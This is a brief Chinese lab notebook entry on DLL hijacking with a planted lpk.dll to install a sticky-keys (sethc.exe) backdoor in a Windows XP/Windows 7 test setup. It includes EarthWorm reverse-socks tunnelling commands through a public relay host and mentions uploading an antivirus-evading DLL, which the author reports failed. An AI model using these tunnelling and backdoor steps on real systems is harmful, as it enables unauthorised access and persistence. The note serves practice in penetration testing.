# dll劫持
原理：Windows执行exe的时候会调用lpk.dll这个库，默认调用exe所在目录下的lpk.dll然后就上传lpk.dll到含有会经常执行的exe所在的文件夹，然后当执行这个软件的时候就会运行上传的dll，然后这个dll就会上传shift后门，但是shift后门已经有点不适用了
- Windows从win8开始就默认使用网络级别的验证，就是说输入用户名密码不再是远程连接到目标主机后才输入，而是要再远程到对方系统之前就输入。关闭网络级别的身份验证是取消“仅允许运行使用网络级别身份验证的计算机连接（建议）”选项
- Windows目前对system目录的续写权限设置的比较高，想要写入shift后门就需要很高的权限，而shift后门就是为了提高权限。就冲突了

# 实验环境
- Windows xp 攻击机
- Windows7 被攻击机
- 公网主机 主要用于转发
> 不再一个网段，需要端口转发,实验环境因为这两套系统还有原来的客户端级别的验证方式,假设已经取得了一个shell,(本来想安装一个sqlserver来着 安装包实在太大了  安装上就没法睡觉了 )


# 代理先练一下代理
还是使用ew socks代理,再熟悉一下明天再用别的
```
公网上
./ew_for_Linux32 -s rcsocks -l 1081 -e 8889 
win7上
ew_for_Win.exe -s rssocks -d 45.*.*.190 -e 8889
xp上
Proxifie直接配置全局代理
```
有点不稳 还是来一把端口转发吧
```

```

# 上传lpk.dll
上传的是渗透工具包里面的免杀版本，还附带了一个sethc.exe直接尝试运行这个exe

测试了好几次发现这个lpk.dll还是2007年编译的。。。。应该是针对xp的吧，而且现在win7的system权限也比较高，管理员也修改不了。。。有空弄一个执行简单命令的吧，这个shift后门可能以后就不适用了